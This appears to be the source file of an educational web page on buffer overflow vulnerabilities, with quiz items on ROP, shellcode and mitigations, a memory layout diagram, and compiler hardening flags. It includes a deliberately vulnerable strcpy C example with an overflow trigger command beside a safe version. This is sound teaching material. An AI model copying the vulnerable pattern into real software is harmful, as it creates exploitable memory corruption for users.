    topic: "Exploitation",
    question: "A gadget is:",
    options: ["A short instruction sequence ending in ret", "A device driver", "A debugger", "A patch"],
    correctAnswer: 0,
    explanation: "ROP gadgets end in ret to chain execution.",
  },
  {
    id: 59,
    topic: "Exploitation",
    question: "Control of RIP means you can:",
    options: ["Redirect execution", "Disable logging", "Patch the kernel", "Update drivers"],
    correctAnswer: 0,
    explanation: "RIP control lets you choose the next instruction.",
  },
  {
    id: 60,
    topic: "Exploitation",
    question: "Shellcode is:",
    options: ["Injected executable payload", "A memory allocator", "A compiler flag", "A crash log"],
    correctAnswer: 0,
    explanation: "Shellcode is the payload run by the exploit.",
  },
  {
    id: 61,
    topic: "Exploitation",
    question: "NOP sleds improve:",
    options: ["Exploit reliability", "ASLR strength", "Heap checks", "Symbol resolution"],
    correctAnswer: 0,
    explanation: "A sled increases the landing zone for control flow.",
  },
  {
    id: 62,
    topic: "Exploitation",
    question: "Environment variables can be used to:",
    options: ["Store predictable payloads", "Disable ASLR", "Encrypt traffic", "Enable CFI"],
    correctAnswer: 0,
    explanation: "Large env variables can hold shellcode or data.",
  },
  {
    id: 63,
    topic: "Terminology",
    question: "Stack canaries are also called:",
    options: ["Stack cookies", "Heap guards", "TLS keys", "Thread IDs"],
    correctAnswer: 0,
    explanation: "Canaries are often called stack cookies.",
  },
  {
    id: 64,
    topic: "Protections",
    question: "A non-executable stack means:",
    options: ["Injected code on the stack will not run", "All code is blocked", "ASLR is disabled", "Heap is encrypted"],
    correctAnswer: 0,
    explanation: "NX prevents execution from the stack region.",
  },
  {
    id: 65,
    topic: "Protections",
    question: "ASLR is generally stronger on:",
    options: ["64-bit systems", "16-bit systems", "DOS", "Microcontrollers"],
    correctAnswer: 0,
    explanation: "64-bit address space provides more entropy.",
  },
  {
    id: 66,
    topic: "Debugging",
    question: "Crash triage should include:",
    options: ["Reproduction with the same input", "Deleting logs", "Ignoring stack traces", "Disabling symbols"],
    correctAnswer: 0,
    explanation: "Repro steps confirm the issue and help fix it.",
  },
  {
    id: 67,
    topic: "Prevention",
    question: "Static analysis tools help by:",
    options: ["Finding risky memory operations", "Creating payloads", "Disabling mitigations", "Skipping reviews"],
    correctAnswer: 0,
    explanation: "Static analysis flags unsafe memory use.",
  },
  {
    id: 68,
    topic: "Prevention",
    question: "Code review should focus on:",
    options: ["Copy operations and length checks", "UI colors", "Build server names", "License headers"],
    correctAnswer: 0,
    explanation: "Reviewing copy and length logic finds overflow risks.",
  },
  {
    id: 69,
    topic: "Protections",
    question: "FORTIFY_SOURCE is most effective when:",
    options: ["Optimization is enabled", "Debug symbols are removed", "ASLR is disabled", "No libc is used"],
    correctAnswer: 0,
    explanation: "Fortify relies on compile-time size info with optimization.",
  },
  {
    id: 70,
    topic: "Prevention",
    question: "Using Rust or Go helps because they:",
    options: ["Enforce memory safety checks", "Disable ASLR", "Remove system calls", "Eliminate input validation"],
    correctAnswer: 0,
    explanation: "Memory-safe languages reduce overflow risk.",
  },
  {
    id: 71,
    topic: "Heap",
    question: "A heap overflow can overwrite:",
    options: ["Function pointers or vtables", "CPU registers only", "The kernel image", "BIOS settings"],
    correctAnswer: 0,
    explanation: "Overwriting function pointers can hijack control flow.",
  },
  {
    id: 72,
    topic: "Types",
    question: "Use-after-free can lead to:",
    options: ["Type confusion and code execution", "Automatic patching", "Stronger canaries", "Only log noise"],
    correctAnswer: 0,
    explanation: "Dangling pointers can be abused after reuse.",
  },
  {
    id: 73,
    topic: "Types",
    question: "Off-by-one bugs are dangerous because:",
    options: ["A single byte can corrupt critical metadata", "They only affect logs", "They improve performance", "They trigger safe defaults"],
    correctAnswer: 0,
    explanation: "A one-byte overwrite can still redirect control.",
  },
  {
    id: 74,
    topic: "Safe APIs",
    question: "Bounds-checked functions still require:",
    options: ["Correct length values", "No testing", "No review", "No validation"],
    correctAnswer: 0,
    explanation: "Passing the wrong size can still be unsafe.",
  },
  {
    id: 75,
    topic: "Fundamentals",
    question: "The key difference between stack and heap is:",
    options: ["Stack is for call frames; heap is for dynamic allocations", "Heap is always executable", "Stack is only for strings", "Heap is only for code"],
    correctAnswer: 0,
    explanation: "The stack holds call frames; the heap stores dynamic data.",
  },
];

// Quick stats
const quickStats = [
  { value: "6", label: "Overflow Types", color: "#dc2626" },
  { value: "6", label: "Mitigations", color: "#3b82f6" },
  { value: "75", label: "Quiz Questions", color: "#8b5cf6" },
  { value: "35+", label: "Years of History", color: "#f59e0b" },
];

export default function BufferOverflowGuidePage() {
  const theme = useTheme();
  const navigate = useNavigate();
  const accent = "#dc2626";

  // Navigation state
  const [navDrawerOpen, setNavDrawerOpen] = useState(false);
  const [activeSection, setActiveSection] = useState<string>("");
  const isMobile = useMediaQuery(theme.breakpoints.down("md"));

  const sectionNavItems = [
    { id: "intro", label: "Introduction", icon: <SchoolIcon /> },
    { id: "overflow-types", label: "Overflow Types", icon: <BugReportIcon /> },
    { id: "vulnerable-code", label: "Vulnerable Code", icon: <CodeIcon /> },
    { id: "protections", label: "Protections", icon: <ShieldIcon /> },
    { id: "exploitation", label: "Exploitation", icon: <WarningIcon /> },
    { id: "heap-exploitation", label: "Heap Techniques", icon: <StorageIcon /> },
    { id: "aslr-bypass", label: "ASLR Bypass", icon: <SecurityIcon /> },
    { id: "windows-exploitation", label: "Windows", icon: <MemoryIcon /> },
    { id: "arm-exploitation", label: "ARM", icon: <MemoryIcon /> },
    { id: "real-world-cves", label: "Real-World CVEs", icon: <HistoryIcon /> },
    { id: "tools", label: "Tools", icon: <BuildIcon /> },
    { id: "prevention", label: "Prevention", icon: <CheckCircleIcon /> },
    { id: "quiz", label: "Quiz", icon: <QuizIcon /> },
  ];

  const scrollToSection = (sectionId: string) => {
    const element = document.getElementById(sectionId);
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" });
      setNavDrawerOpen(false);
    }
  };

  useEffect(() => {
    const handleScroll = () => {
      const sections = sectionNavItems.map((item) => item.id);
      let currentSection = "";

      for (const sectionId of sections) {
        const element = document.getElementById(sectionId);
        if (element) {
          const rect = element.getBoundingClientRect();
          if (rect.top <= 150) {
            currentSection = sectionId;
          }
        }
      }
      setActiveSection(currentSection);
    };

    window.addEventListener("scroll", handleScroll);
    handleScroll();
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const scrollToTop = () => window.scrollTo({ top: 0, behavior: "smooth" });

  const currentIndex = sectionNavItems.findIndex((item) => item.id === activeSection);
  const progressPercent = currentIndex >= 0 ? ((currentIndex + 1) / sectionNavItems.length) * 100 : 0;

  const getSeverityColor = (severity: string) => {
    switch (severity.toLowerCase()) {
      case "critical": return "#dc2626";
      case "high": return "#f59e0b";
      case "medium": return "#3b82f6";
      case "low": return "#22c55e";
      default: return "#6b7280";
    }
  };

  const pageContext = `Buffer Overflow Attacks - A comprehensive guide covering stack-based buffer overflows, heap overflows, exploitation techniques, and modern mitigations like ASLR, DEP/NX, Stack Canaries, and CFI. Topics include: memory layout, stack frames, return address overwriting, shellcode injection, ROP (Return-Oriented Programming), heap exploitation, format string vulnerabilities, and secure coding practices to prevent buffer overflows in C/C++ code.`;

  const sidebarNav = (
    <Paper
      elevation={0}
      sx={{
        width: 220,
        flexShrink: 0,
        position: "sticky",
        top: 80,
        maxHeight: "calc(100vh - 100px)",
        overflowY: "auto",
        borderRadius: 3,
        border: `1px solid ${alpha(accent, 0.15)}`,
        bgcolor: alpha(theme.palette.background.paper, 0.6),
        display: { xs: "none", lg: "block" },
        "&::-webkit-scrollbar": {
          width: 6,
        },
        "&::-webkit-scrollbar-thumb": {
          bgcolor: alpha(accent, 0.3),
          borderRadius: 3,
        },
      }}
    >
      <Box sx={{ p: 2 }}>
        <Typography
          variant="subtitle2"
          sx={{ fontWeight: 700, mb: 1, color: accent, display: "flex", alignItems: "center", gap: 1 }}
        >
          <ListAltIcon sx={{ fontSize: 18 }} />
          Course Navigation
        </Typography>
        <Box sx={{ mb: 2 }}>
          <Box sx={{ display: "flex", justifyContent: "space-between", mb: 0.5 }}>
            <Typography variant="caption" color="text.secondary">
              Progress
            </Typography>
            <Typography variant="caption" sx={{ fontWeight: 600, color: accent }}>
              {Math.round(progressPercent)}%
            </Typography>
          </Box>
          <LinearProgress
            variant="determinate"
            value={progressPercent}
            sx={{
              height: 6,
              borderRadius: 3,
              bgcolor: alpha(accent, 0.1),
              "& .MuiLinearProgress-bar": {
                bgcolor: accent,
                borderRadius: 3,
              },
            }}
          />
        </Box>
        <Divider sx={{ mb: 1 }} />
        <List dense sx={{ mx: -1 }}>
          {sectionNavItems.map((item) => (
            <ListItem
              key={item.id}
              onClick={() => scrollToSection(item.id)}
              sx={{
                borderRadius: 1.5,
                mb: 0.25,
                py: 0.5,
                cursor: "pointer",
                bgcolor: activeSection === item.id ? alpha(accent, 0.15) : "transparent",
                borderLeft: activeSection === item.id ? `3px solid ${accent}` : "3px solid transparent",
                "&:hover": {
                  bgcolor: alpha(accent, 0.08),
                },
                transition: "all 0.15s ease",
              }}
            >
              <ListItemIcon sx={{ minWidth: 24, fontSize: "0.9rem" }}>{item.icon}</ListItemIcon>
              <ListItemText
                primary={
                  <Typography
                    variant="caption"
                    sx={{
                      fontWeight: activeSection === item.id ? 700 : 500,
                      color: activeSection === item.id ? accent : "text.secondary",
                      fontSize: "0.75rem",
                    }}
                  >
                    {item.label}
                  </Typography>
                }
              />
            </ListItem>
          ))}
        </List>
      </Box>
    </Paper>
  );

  return (
    <LearnPageLayout pageTitle="Buffer Overflow Attacks" pageContext={pageContext}>
      {/* Floating Navigation Button - Mobile Only */}
      <Tooltip title="Navigate Sections" placement="left">
        <Fab
          color="primary"
          onClick={() => setNavDrawerOpen(true)}
          sx={{
            position: "fixed",
            bottom: 90,
            right: 24,
            zIndex: 1000,
            bgcolor: accent,
            "&:hover": { bgcolor: "#b91c1c" },
            boxShadow: `0 4px 20px ${alpha(accent, 0.4)}`,
            display: { xs: "flex", lg: "none" },
          }}
        >
          <ListAltIcon />
        </Fab>
      </Tooltip>

      {/* Scroll to Top Button - Mobile Only */}
      <Tooltip title="Scroll to Top" placement="left">
        <Fab
          size="small"
          onClick={scrollToTop}
          sx={{
            position: "fixed",
            bottom: 32,
            right: 28,
            zIndex: 1000,
            bgcolor: alpha(accent, 0.15),
            color: accent,
            "&:hover": { bgcolor: alpha(accent, 0.25) },
            display: { xs: "flex", lg: "none" },
          }}
        >
          <KeyboardArrowUpIcon />
        </Fab>
      </Tooltip>

      {/* Navigation Drawer - Mobile */}
      <Drawer
        anchor="right"
        open={navDrawerOpen}
        onClose={() => setNavDrawerOpen(false)}
        PaperProps={{
          sx: {
            width: isMobile ? "85%" : 320,
            bgcolor: theme.palette.background.paper,
            backgroundImage: "none",
          },
        }}
      >
        <Box sx={{ p: 2 }}>
          <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, display: "flex", alignItems: "center", gap: 1 }}>
              <ListAltIcon sx={{ color: accent }} />
              Course Navigation
            </Typography>
            <IconButton onClick={() => setNavDrawerOpen(false)} size="small">
              <CloseIcon />
            </IconButton>
          </Box>

          <Divider sx={{ mb: 2 }} />

          {/* Progress indicator */}
          <Box sx={{ mb: 2, p: 1.5, borderRadius: 2, bgcolor: alpha(accent, 0.05) }}>
            <Box sx={{ display: "flex", justifyContent: "space-between", mb: 0.5 }}>
              <Typography variant="caption" color="text.secondary">
                Progress
              </Typography>
              <Typography variant="caption" sx={{ fontWeight: 600, color: accent }}>
                {Math.round(progressPercent)}%
              </Typography>
            </Box>
            <LinearProgress
              variant="determinate"
              value={progressPercent}
              sx={{
                height: 6,
                borderRadius: 3,
                bgcolor: alpha(accent, 0.1),
                "& .MuiLinearProgress-bar": {
                  bgcolor: accent,
                  borderRadius: 3,
                },
              }}
            />
          </Box>

          {/* Navigation List */}
          <List dense sx={{ mx: -1 }}>
            {sectionNavItems.map((item) => (
              <ListItem
                key={item.id}
                onClick={() => scrollToSection(item.id)}
                sx={{
                  borderRadius: 2,
                  mb: 0.5,
                  cursor: "pointer",
                  bgcolor: activeSection === item.id ? alpha(accent, 0.15) : "transparent",
                  borderLeft: activeSection === item.id ? `3px solid ${accent}` : "3px solid transparent",
                  "&:hover": {
                    bgcolor: alpha(accent, 0.1),
                  },
                  transition: "all 0.2s ease",
                }}
              >
                <ListItemIcon sx={{ minWidth: 32, fontSize: "1.1rem" }}>{item.icon}</ListItemIcon>
                <ListItemText
                  primary={
                    <Typography
                      variant="body2"
                      sx={{
                        fontWeight: activeSection === item.id ? 700 : 500,
                        color: activeSection === item.id ? accent : "text.primary",
                      }}
                    >
                      {item.label}
                    </Typography>
                  }
                />
                {activeSection === item.id && (
                  <Chip
                    label="Current"
                    size="small"
                    sx={{
                      height: 20,
                      fontSize: "0.65rem",
                      bgcolor: alpha(accent, 0.2),
                      color: accent,
                    }}
                  />
                )}
              </ListItem>
            ))}
          </List>

          <Divider sx={{ my: 2 }} />

          {/* Quick Actions */}
          <Box sx={{ display: "flex", gap: 1 }}>
            <Button
              size="small"
              variant="outlined"
              onClick={scrollToTop}
              startIcon={<KeyboardArrowUpIcon />}
              sx={{ flex: 1, borderColor: alpha(accent, 0.3), color: accent }}
            >
              Top
            </Button>
            <Button
              size="small"
              variant="outlined"
              onClick={() => scrollToSection("quiz")}
              startIcon={<QuizIcon />}
              sx={{ flex: 1, borderColor: alpha(accent, 0.3), color: accent }}
            >
              Quiz
            </Button>
          </Box>
        </Box>
      </Drawer>

      {/* Main Layout with Sidebar */}
      <Box sx={{ display: "flex", gap: 3, maxWidth: 1400, mx: "auto", px: { xs: 2, sm: 3 }, py: 4 }}>
        {sidebarNav}

        <Box sx={{ flex: 1, minWidth: 0 }}>
          {/* Back Button */}
          <Chip
            component={Link}
            to="/learn"
            icon={<ArrowBackIcon />}
            label="Back to Learning Hub"
            clickable
            variant="outlined"
            sx={{ borderRadius: 2, mb: 3 }}
          />

          {/* Hero Banner */}
          <Paper
            sx={{
              p: 4,
              mb: 4,
              borderRadius: 4,
              background: `linear-gradient(135deg, ${alpha("#dc2626", 0.15)} 0%, ${alpha("#f59e0b", 0.15)} 50%, ${alpha("#8b5cf6", 0.15)} 100%)`,
              border: `1px solid ${alpha("#dc2626", 0.2)}`,
              position: "relative",
              overflow: "hidden",
            }}
          >
            {/* Decorative background elements */}
            <Box
              sx={{
                position: "absolute",
                top: -50,
                right: -50,
                width: 200,
                height: 200,
                borderRadius: "50%",
                background: `radial-gradient(circle, ${alpha("#dc2626", 0.1)} 0%, transparent 70%)`,
              }}
            />
            <Box
              sx={{
                position: "absolute",
                bottom: -30,
                left: "30%",
                width: 150,
                height: 150,
                borderRadius: "50%",
                background: `radial-gradient(circle, ${alpha("#8b5cf6", 0.1)} 0%, transparent 70%)`,
              }}
            />

            <Box sx={{ position: "relative", zIndex: 1 }}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 3, mb: 3 }}>
                <Box
                  sx={{
                    width: 80,
                    height: 80,
                    borderRadius: 3,
                    background: `linear-gradient(135deg, #dc2626, #f59e0b)`,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    boxShadow: `0 8px 32px ${alpha("#dc2626", 0.3)}`,
                  }}
                >
                  <MemoryIcon sx={{ fontSize: 44, color: "white" }} />
                </Box>
                <Box>
                  <Typography variant="h3" sx={{ fontWeight: 800, mb: 0.5 }}>
                    Buffer Overflow Vulnerabilities
                  </Typography>
                  <Typography variant="h6" color="text.secondary" sx={{ fontWeight: 400 }}>
                    Memory corruption fundamentals, exploitation, and mitigations
                  </Typography>
                </Box>
              </Box>

              <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap", mb: 3 }}>
                <Chip label="Intermediate" color="warning" />
                <Chip label="Exploitation" sx={{ bgcolor: alpha("#dc2626", 0.15), color: "#dc2626", fontWeight: 600 }} />
                <Chip label="Memory Safety" sx={{ bgcolor: alpha("#3b82f6", 0.15), color: "#3b82f6", fontWeight: 600 }} />
                <Chip label="Binary Security" sx={{ bgcolor: alpha("#8b5cf6", 0.15), color: "#8b5cf6", fontWeight: 600 }} />
                <Chip label="CTF Skills" sx={{ bgcolor: alpha("#10b981", 0.15), color: "#10b981", fontWeight: 600 }} />
              </Box>

              {/* Quick Stats */}
              <Grid container spacing={2}>
                {quickStats.map((stat) => (
                  <Grid item xs={6} sm={3} key={stat.label}>
                    <Paper
                      sx={{
                        p: 2,
                        textAlign: "center",
                        borderRadius: 2,
                        bgcolor: alpha(stat.color, 0.1),
                        border: `1px solid ${alpha(stat.color, 0.2)}`,
                      }}
                    >
                      <Typography variant="h4" sx={{ fontWeight: 800, color: stat.color }}>
                        {stat.value}
                      </Typography>
                      <Typography variant="caption" color="text.secondary" sx={{ fontWeight: 600 }}>
                        {stat.label}
                      </Typography>
                    </Paper>
                  </Grid>
                ))}
              </Grid>
            </Box>
          </Paper>

          {/* Quick Navigation */}
          <Paper
            sx={{
              p: 2,
              mb: 4,
              borderRadius: 3,
              position: "sticky",
              top: 70,
              zIndex: 100,
              backdropFilter: "blur(10px)",
              bgcolor: alpha(theme.palette.background.paper, 0.9),
              border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
              boxShadow: `0 4px 20px ${alpha("#000", 0.1)}`,
            }}
          >
            <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1.5 }}>
              <Chip
                label="<- Learning Hub"
                size="small"
                clickable
                onClick={() => navigate("/learn")}
                sx={{
                  fontWeight: 700,
                  fontSize: "0.75rem",
                  bgcolor: alpha(accent, 0.1),
                  color: accent,
                  "&:hover": {
                    bgcolor: alpha(accent, 0.2),
                  },
                }}
              />
              <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "text.secondary" }}>
                Quick Navigation
              </Typography>
            </Box>
            <Box sx={{ display: "flex", flexWrap: "wrap", gap: 1 }}>
              {sectionNavItems.map((nav) => (
                <Chip
                  key={nav.id}
                  label={nav.label}
                  size="small"
                  clickable
                  onClick={() => scrollToSection(nav.id)}
                  sx={{
                    fontWeight: 600,
                    fontSize: "0.75rem",
                    "&:hover": {
                      bgcolor: alpha(accent, 0.15),
                      color: accent,
                    },
                  }}
                />
              ))}
            </Box>
          </Paper>

          {/* ==================== INTRODUCTION ==================== */}
          <Typography id="intro" variant="h4" sx={{ fontWeight: 800, mb: 1, scrollMarginTop: 180 }}>
            What is a Buffer Overflow?
          </Typography>
          <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
            Understanding one of the oldest and most dangerous vulnerability classes
          </Typography>

          <Paper sx={{ p: 4, mb: 5, borderRadius: 3, bgcolor: alpha("#3b82f6", 0.03), border: `1px solid ${alpha("#3b82f6", 0.1)}` }}>
            <Typography variant="body1" sx={{ lineHeight: 1.9, fontSize: "1.05rem", mb: 3 }}>
              Imagine you have a row of 10 mailboxes, and you're only allowed to put letters in boxes 1-10.
              A <strong>buffer overflow</strong> happens when someone tries to stuff letters into box 11, 12, and beyond --
              except those boxes belong to someone else! In computer memory, this "someone else" might be critical
              program data like return addresses, function pointers, or security tokens.
            </Typography>

            <Typography variant="body1" sx={{ lineHeight: 1.9, fontSize: "1.05rem", mb: 3 }}>
              In programming terms, a <strong>buffer</strong> is just a chunk of memory set aside to hold data --
              like a character array to store a username. When a program writes more data into this buffer than
              it can hold, the extra data "overflows" into adjacent memory locations. This overflow can corrupt
              other variables, crash the program, or -- in the worst case -- allow an attacker to execute their
              own malicious code.
            </Typography>

            <Typography variant="body1" sx={{ lineHeight: 1.9, fontSize: "1.05rem", mb: 3 }}>
              Buffer overflows have been around since the 1988 Morris Worm, one of the first computer worms to
              spread across the Internet. Despite being a well-known vulnerability class for over 35 years,
              they remain one of the most dangerous and common security issues in low-level languages like C and C++.
              Major attacks like <strong>EternalBlue</strong> (WannaCry ransomware) and <strong>Heartbleed</strong>
              exploited memory corruption vulnerabilities.
            </Typography>

            <Box sx={{
              p: 2,
              borderRadius: 2,
              bgcolor: alpha("#dc2626", 0.1),
              border: `1px solid ${alpha("#dc2626", 0.3)}`,
            }}>
              <Typography variant="body2" sx={{ fontWeight: 600, display: "flex", alignItems: "center", gap: 1 }}>
                <WarningIcon sx={{ fontSize: 18, color: "#dc2626" }} />
                Why This Matters
              </Typography>
              <Typography variant="body2" sx={{ mt: 1, lineHeight: 1.7 }}>
                Buffer overflows can lead to: <strong>Remote Code Execution (RCE)</strong> -- attackers run their code on your system;
                <strong> Privilege Escalation</strong> -- gaining admin/root access; <strong>Denial of Service</strong> -- crashing
                services; and <strong>Information Disclosure</strong> -- leaking sensitive memory contents. Understanding these
                vulnerabilities is essential for both defenders building secure systems and security researchers finding bugs.
              </Typography>
            </Box>
          </Paper>

          {/* ==================== OVERFLOW TYPES ==================== */}
          <Typography id="overflow-types" variant="h4" sx={{ fontWeight: 800, mb: 1, scrollMarginTop: 180 }}>
            Types of Buffer Overflow Vulnerabilities
          </Typography>
          <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
            Different vulnerability classes and their characteristics
          </Typography>

          <TableContainer component={Paper} sx={{ borderRadius: 2, mb: 4 }}>
            <Table>
              <TableHead>
                <TableRow sx={{ bgcolor: alpha(theme.palette.primary.main, 0.05) }}>
                  <TableCell sx={{ fontWeight: 700 }}>Type</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Description</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Severity</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Example</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {overflowTypes.map((type) => (
                  <TableRow key={type.name} hover>
                    <TableCell sx={{ fontWeight: 600, fontFamily: "monospace" }}>{type.name}</TableCell>
                    <TableCell>{type.description}</TableCell>
                    <TableCell>
                      <Chip
                        label={type.severity}
                        size="small"
                        sx={{
                          bgcolor: alpha(getSeverityColor(type.severity), 0.15),
                          color: getSeverityColor(type.severity),
                          fontWeight: 600,
                        }}
                      />
                    </TableCell>
                    <TableCell sx={{ fontFamily: "monospace", fontSize: "0.8rem" }}>{type.example}</TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>

          <Accordion defaultExpanded sx={{ borderRadius: 2, mb: 5 }}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography sx={{ fontWeight: 600 }}>
                <StorageIcon sx={{ mr: 1, verticalAlign: "middle", color: "#dc2626" }} />
                Memory Layout Overview
              </Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="Typical Process Memory Layout (High to Low Addresses)">
{`+-------------------------------------+  High Address (0xFFFFFFFF)
|           Kernel Space              |  (Not accessible to user programs)
+-------------------------------------+
|              Stack                  |  <- Local variables, return addresses
|              v                      |    (Grows downward)
+-------------------------------------+
|           (Free Space)              |
+-------------------------------------+
|              ^                      |
|              Heap                   |  <- Dynamic memory (malloc/new)
|                                     |    (Grows upward)
+-------------------------------------+
|         Uninitialized Data          |  <- BSS segment (global vars = 0)
+-------------------------------------+
|         Initialized Data            |  <- Data segment (global vars)
+-------------------------------------+
|         Text/Code Segment           |  <- Program instructions (read-only)
+-------------------------------------+  Low Address (0x00000000)`}
              </CodeBlock>
              <Typography variant="body2" color="text.secondary" sx={{ mt: 2 }}>
                Stack overflows typically overwrite the return address, causing the program to jump to
                attacker-controlled memory. Heap overflows corrupt metadata structures used by memory allocators.
              </Typography>
            </AccordionDetails>
          </Accordion>

          {/* ==================== VULNERABLE CODE ==================== */}
          <Typography id="vulnerable-code" variant="h4" sx={{ fontWeight: 800, mb: 1, scrollMarginTop: 180 }}>
            Vulnerable Functions & Patterns
          </Typography>
          <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
            Common dangerous functions and their safe alternatives
          </Typography>

          <TableContainer component={Paper} sx={{ borderRadius: 2, mb: 4 }}>
            <Table>
              <TableHead>
                <TableRow sx={{ bgcolor: alpha(theme.palette.primary.main, 0.05) }}>
                  <TableCell sx={{ fontWeight: 700 }}>Language</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Dangerous Function</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Safe Alternative</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Risk</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {vulnerableFunctions.map((func, idx) => (
                  <TableRow key={idx} hover>
                    <TableCell>{func.language}</TableCell>
                    <TableCell sx={{ fontFamily: "monospace", color: "#dc2626" }}>{func.function}</TableCell>
                    <TableCell sx={{ fontFamily: "monospace", color: "#22c55e" }}>{func.safe}</TableCell>
                    <TableCell>{func.risk}</TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>

          <Grid container spacing={3} sx={{ mb: 5 }}>
            <Grid item xs={12} md={6}>
              <Paper sx={{ p: 3, height: "100%", borderRadius: 3, border: `1px solid ${alpha("#dc2626", 0.2)}` }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#dc2626", display: "flex", alignItems: "center", gap: 1 }}>
                  <CancelIcon /> Vulnerable Code Example
                </Typography>
                <CodeBlock title="Classic Stack Buffer Overflow (C)">
{`#include <stdio.h>
#include <string.h>

void vulnerable_function(char *user_input) {
    char buffer[64];  // Fixed-size buffer

    // VULNERABLE: No bounds checking!
    strcpy(buffer, user_input);

    printf("You entered: %s\\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}

// Attacker provides: ./program $(python -c 'print("A"*100)')
// Result: Buffer overflow, potential code execution`}
                </CodeBlock>
              </Paper>
            </Grid>
            <Grid item xs={12} md={6}>
              <Paper sx={{ p: 3, height: "100%", borderRadius: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e", display: "flex", alignItems: "center", gap: 1 }}>
                  <CheckCircleIcon /> Safe Code Example
                </Typography>
                <CodeBlock title="Secure Implementation (C)">
{`#include <stdio.h>
#include <string.h>

void safe_function(const char *user_input) {
    char buffer[64];

    // SAFE: Use strncpy with explicit size limit
    strncpy(buffer, user_input, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\\0';

    printf("You entered: %s\\n", buffer);
}

// Even better: Use snprintf for formatted strings
void safer_function(const char *user_input) {
    char buffer[64];

    // snprintf always null-terminates
    int needed = snprintf(buffer, sizeof(buffer), "%s", user_input);
    if (needed >= sizeof(buffer)) {
        printf("Warning: Input truncated\\n");
    }

    printf("You entered: %s\\n", buffer);
}`}
                </CodeBlock>
              </Paper>
            </Grid>
          </Grid>

          {/* ==================== PROTECTIONS ==================== */}
          <Typography id="protections" variant="h4" sx={{ fontWeight: 800, mb: 1, scrollMarginTop: 180 }}>
            Modern Memory Protections
          </Typography>
          <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
            Defense mechanisms and their bypass techniques
          </Typography>

          <Grid container spacing={3} sx={{ mb: 4 }}>
            {memoryProtections.map((protection) => (
              <Grid item xs={12} md={6} key={protection.name}>
                <Card sx={{ height: "100%", borderRadius: 2 }}>
                  <CardContent>
                    <Typography variant="h6" sx={{ fontWeight: 700, mb: 1, display: "flex", alignItems: "center" }}>
                      <ShieldIcon sx={{ mr: 1, color: "#3b82f6" }} />
                      {protection.name}
                    </Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
                      {protection.description}
                    </Typography>
                    <Box sx={{ display: "flex", flexDirection: "column", gap: 1 }}>
                      <Chip
                        label={`Bypass: ${protection.bypass}`}
                        size="small"
                        variant="outlined"
                        sx={{ alignSelf: "flex-start" }}
                      />
                      <Typography variant="caption" sx={{ fontFamily: "monospace", color: "text.secondary" }}>
                        {protection.compiler}
                      </Typography>
                    </Box>
                  </CardContent>
                </Card>
              </Grid>
            ))}
          </Grid>

          <Accordion sx={{ borderRadius: 2, mb: 5 }}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography sx={{ fontWeight: 600 }}>
                <BuildIcon sx={{ mr: 1, verticalAlign: "middle", color: "#3b82f6" }} />
                Checking Binary Protections (checksec)
              </Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="Using checksec to analyze binary security">
{`$ checksec --file=./vulnerable_binary

RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX enabled    No PIE

# What each means:
# RELRO: Full = GOT protected, Partial = Some protection
# STACK CANARY: Protects against stack smashing
# NX: No-eXecute, prevents shellcode execution on stack
# PIE: Position Independent, enables full ASLR

# Compile with all protections:
$ gcc -o secure_binary source.c \\
    -fstack-protector-all \\
    -pie -fPIE \\
    -Wl,-z,relro,-z,now \\
    -D_FORTIFY_SOURCE=2`}
              </CodeBlock>
            </AccordionDetails>
          </Accordion>

          {/* ==================== EXPLOITATION ==================== */}
          <Typography id="exploitation" variant="h4" sx={{ fontWeight: 800, mb: 1, scrollMarginTop: 180 }}>
            Exploitation Techniques
          </Typography>
          <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
            Methods used to exploit buffer overflow vulnerabilities
          </Typography>

          <TableContainer component={Paper} sx={{ borderRadius: 2, mb: 4 }}>
            <Table>
              <TableHead>
                <TableRow sx={{ bgcolor: alpha(theme.palette.primary.main, 0.05) }}>
                  <TableCell sx={{ fontWeight: 700 }}>Technique</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Description</TableCell>
                  <TableCell sx={{ fontWeight: 700 }}>Use Case</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {exploitationTechniques.map((tech) => (
                  <TableRow key={tech.name} hover>
                    <TableCell sx={{ fontWeight: 600 }}>{tech.name}</TableCell>
                    <TableCell>{tech.description}</TableCell>
                    <TableCell>{tech.useCase}</TableCell>
